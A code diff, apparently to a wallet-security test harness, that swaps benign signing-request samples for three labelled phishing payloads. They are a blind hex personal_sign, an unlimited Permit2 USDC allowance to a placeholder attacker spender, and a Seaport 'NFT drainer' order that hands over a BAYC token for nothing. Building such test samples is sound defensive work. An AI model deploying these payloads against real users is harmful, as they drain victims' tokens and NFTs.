@@ -255,53 +255,144 @@ const SAMPLES = {
       })],
     }),
   },
-  ethTransfer: {
-    method: 'eth_sendTransaction',
-    label: 'ETH Transfer',
+  blindEthSign: {
+    method: 'personal_sign',
+    label: 'Blind Hex Sign',
+    // personal_sign is supported by MetaMask, unlike eth_sign in many dapp contexts.
+    // Using an opaque hex payload still reproduces the same "blind signature" phishing UX.
     build: (addr) => ({
-      method: 'eth_sendTransaction',
-      params: [{
-        from: addr,
-        to: '0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045',
-        value: '0x2386F26FC10000', // 0.01 ETH
-        gas: '0x5208',            // 21000
-      }],
+      method: 'personal_sign',
+      params: [
+        '0x4a5c5d454721bbbb25540c3317521e71c373ae36fef33a82cb1c4f2bf2d79dc3',
+        addr,
+      ],
     }),
   },
-  multicallTx: {
-    method: 'eth_sendTransaction',
-    label: 'Multicall Tx',
+  phishingPermit: {
+    method: 'eth_signTypedData_v4',
+    label: 'Phishing Permit',
+    // Uses the same Permit2 shape that MetaMask already accepts in the working sample,
+    // but swaps in an attacker-controlled spender and keeps the unlimited amount.
     build: (addr) => ({
-      method: 'eth_sendTransaction',
-      params: [{
-        from: addr,
-        to: '0xcA11bde05977b3631167028862bE2a173976CA11', // Multicall3
-        data: '0xac9650d8' +
-          '0000000000000000000000000000000000000000000000000000000000000020' +
-          '0000000000000000000000000000000000000000000000000000000000000002' +
-          '0000000000000000000000000000000000000000000000000000000000000040' +
-          '0000000000000000000000000000000000000000000000000000000000000080' +
-          '0000000000000000000000000000000000000000000000000000000000000004' +
-          '18160ddd00000000000000000000000000000000000000000000000000000000' +
-          '0000000000000000000000000000000000000000000000000000000000000004' +
-          '95d89b4100000000000000000000000000000000000000000000000000000000',
-        gas: '0x30D40', // 200000
-      }],
+      method: 'eth_signTypedData_v4',
+      params: [addr, JSON.stringify({
+        types: {
+          EIP712Domain: [
+            { name: 'name', type: 'string' },
+            { name: 'chainId', type: 'uint256' },
+            { name: 'verifyingContract', type: 'address' },
+          ],
+          PermitSingle: [
+            { name: 'details', type: 'PermitDetails' },
+            { name: 'spender', type: 'address' },
+            { name: 'sigDeadline', type: 'uint256' },
+          ],
+          PermitDetails: [
+            { name: 'token', type: 'address' },
+            { name: 'amount', type: 'uint160' },
+            { name: 'expiration', type: 'uint48' },
+            { name: 'nonce', type: 'uint48' },
+          ],
+        },
+        primaryType: 'PermitSingle',
+        domain: {
+          name: 'Permit2',
+          chainId: 1,
+          verifyingContract: '0x000000000022D473030F116dDEE9F6B43aC78BA3',
+        },
+        message: {
+          details: {
+            token: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
+            // MAX_UINT160 = unlimited Permit2 allowance
+            amount: '1461501637330902918203684832716283019655932542975',
+            expiration: '281474976710655',
+            nonce: '0',
+          },
+          // Attacker-controlled spender instead of a known router
+          spender: '0xbaDc0FFee0000000000000000000000000000001',
+          sigDeadline: '1999999999',
+        },
+      })],
     }),
   },
-  erc20Approve: {
-    method: 'eth_sendTransaction',
-    label: 'ERC-20 Approve',
+  nftDrainer: {
+    method: 'eth_signTypedData_v4',
+    label: 'NFT Drainer',
+    // Seaport order: user offers a Bored Ape NFT, consideration is 0 ETH.
+    // Attacker receives the NFT for free. Classic NFT drainer via fake "claim" site.
     build: (addr) => ({
-      method: 'eth_sendTransaction',
-      params: [{
-        from: addr,
-        to: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', // USDC
-        data: '0x095ea7b3' +
-          '000000000000000000000000Def1C0ded9bec7F1a1670819833240f027b25EfF' +
-          'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff',
-        gas: '0xC350', // 50000
-      }],
+      method: 'eth_signTypedData_v4',
+      params: [addr, JSON.stringify({
+        types: {
+          EIP712Domain: [
+            { name: 'name',    type: 'string'  },
+            { name: 'version', type: 'string'  },
+            { name: 'chainId', type: 'uint256' },
+            { name: 'verifyingContract', type: 'address' },
+          ],
+          OrderComponents: [
+            { name: 'offerer',   type: 'address' },
+            { name: 'zone',      type: 'address' },
+            { name: 'offer',          type: 'OfferItem[]'         },
+            { name: 'consideration',  type: 'ConsiderationItem[]' },
+            { name: 'orderType',  type: 'uint8'   },
+            { name: 'startTime',  type: 'uint256' },
+            { name: 'endTime',    type: 'uint256' },
+            { name: 'salt',       type: 'uint256' },
+            { name: 'conduitKey', type: 'bytes32' },
+            { name: 'counter',    type: 'uint256' },
+          ],
+          OfferItem: [
+            { name: 'itemType', type: 'uint8'   },
+            { name: 'token',    type: 'address' },
+            { name: 'identifierOrCriteria', type: 'uint256' },
+            { name: 'startAmount', type: 'uint256' },
+            { name: 'endAmount',   type: 'uint256' },
+          ],
+          ConsiderationItem: [
+            { name: 'itemType', type: 'uint8'   },
+            { name: 'token',    type: 'address' },
+            { name: 'identifierOrCriteria', type: 'uint256' },
+            { name: 'startAmount', type: 'uint256' },
+            { name: 'endAmount',   type: 'uint256' },
+            { name: 'recipient',   type: 'address' },
+          ],
+        },
+        primaryType: 'OrderComponents',
+        domain: {
+          name: 'Seaport',
+          version: '1.5',
+          chainId: 1,
+          verifyingContract: '0x00000000000000ADc04C56Bf30aC9d3c0aAF14dC',
+        },
+        message: {
+          offerer: addr,
+          zone: '0x0000000000000000000000000000000000000000',
+          offer: [{
+            itemType: 2, // ERC-721
+            token: '0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D', // BAYC
+            identifierOrCriteria: '3681',
+            startAmount: '1',
+            endAmount: '1',
+          }],
+          // Zero-value consideration — user gets nothing in return
+          consideration: [{
+            itemType: 0, // ETH
+            token: '0x0000000000000000000000000000000000000000',
+            identifierOrCriteria: '0',
+            startAmount: '0',
+            endAmount: '0',
+            // Attacker's wallet receives the NFT
+            recipient: '0xbaDc0FFee0000000000000000000000000000001',
+          }],
+          orderType: 0,
+          startTime: '0',
+          endTime: '1999999999',
+          salt: '99999',
+          conduitKey: '0x0000000000000000000000000000000000000000000000000000000000000000',
+          counter: '0',
+        },
+      })],
     }),
   },
 };
